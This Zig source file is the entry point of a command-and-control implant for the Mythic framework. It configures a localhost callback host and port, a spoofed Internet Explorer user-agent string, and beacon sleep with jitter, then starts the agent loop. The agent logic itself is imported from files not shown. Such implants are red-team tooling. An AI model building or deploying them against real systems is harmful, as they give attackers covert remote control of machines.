const std = @import("std");
const agent = @import("agent.zig");
const types = @import("types.zig");

const print = std.debug.print;
const MythicAgent = agent.MythicAgent;
const AgentConfig = types.AgentConfig;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    
    const config = AgentConfig{
        .callback_host = "http://127.0.0.1",
        .callback_port = 80,
        .user_agent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
        .sleep_interval = 10,
        .jitter = 0.1,
        .encrypted_exchange_check = true,
    };
    
    var mythic_agent = try MythicAgent.init(allocator, config);
    defer mythic_agent.deinit();
    
    print("[+] Starting Mythic C2 Agent\n", .{});
    print("[+] Zig version: 0.14.0\n", .{});
    
    try mythic_agent.run();
}

